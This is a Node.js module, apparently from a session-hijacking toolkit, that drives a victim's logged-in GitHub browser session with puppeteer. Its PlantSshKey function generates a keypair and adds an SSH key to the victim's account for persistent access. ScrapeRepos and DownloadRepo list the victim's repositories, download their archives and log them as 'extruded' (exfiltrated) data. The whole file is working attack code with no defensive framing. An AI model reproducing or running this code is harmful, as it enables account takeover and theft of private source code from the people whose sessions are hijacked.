'use strict';

const crypto = require('crypto');
const sshpk = require('sshpk');
const fs = require('fs/promises');
const db = require('../../db/db');
const clusterLib = require('../../puppeteer/cluster');
const necrohelp = require('../helpers/necrohelp');

function outputPath(taskId, suffix) {
    const safeTask = String(taskId).replace(/[^a-z0-9._-]/gi, '_');
    return necrohelp.getOutputPath(clusterLib.GetConfig(), `${safeTask}${suffix}`);
}

function generateSSH() {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });
    return [sshpk.parseKey(publicKey, 'pem').toString('ssh'), privateKey];
}

exports.PlantSshKey = async function (page, taskId, sshKeyName, sshMaterial) {
    await necrohelp.timedGoto(page, 'https://github.com/settings/ssh/new');
    const [publicKey, privateKey] = generateSSH();
    await fs.writeFile(outputPath(taskId, '.key'), privateKey, { mode: 0o600 });
    await fs.writeFile(outputPath(taskId, '.pub'), publicKey, { mode: 0o644 });

    await page.click('#ssh_key_title');
    await page.type('#ssh_key_title', sshKeyName);
    await page.click('#ssh_key_key');
    await page.type('#ssh_key_key', sshMaterial || publicKey);
    await page.click('#settings-frame > form > p > button');
    await necrohelp.Sleep(500);
    await necrohelp.timedGoto(page, 'https://github.com/settings/keys');
    await page.screenshot({ path: outputPath(taskId, '_keys.png') });
    return { publicKey };
};

exports.ScrapeRepos = async function (page, taskId) {
    await necrohelp.timedGoto(page, 'https://github.com/settings/repositories');
    const links = await page.$$('div.Box-row > a.mr-1');
    const repositories = [];
    for (const link of links) {
        const href = await (await link.getProperty('href')).jsonValue();
        repositories.push(`${href}/archive/refs/heads/master.zip`);
    }
    return repositories;
};

exports.DownloadRepo = async function (page, taskId, downloadUrl) {
    const downloadPath = necrohelp.getOutputDirectory(clusterLib.GetConfig());
    await necrohelp.setDownloadBehavior(page, downloadPath);
    await necrohelp.timedGoto(page, downloadUrl);
    await necrohelp.Sleep(10000);
    const parsed = new URL(downloadUrl);
    const archive = `${parsed.pathname.split('/')[1] || 'repository'}-master.zip`;
    await db.AddExtrudedData(taskId, `repository_${archive}`, downloadPath);
    return downloadPath;
};
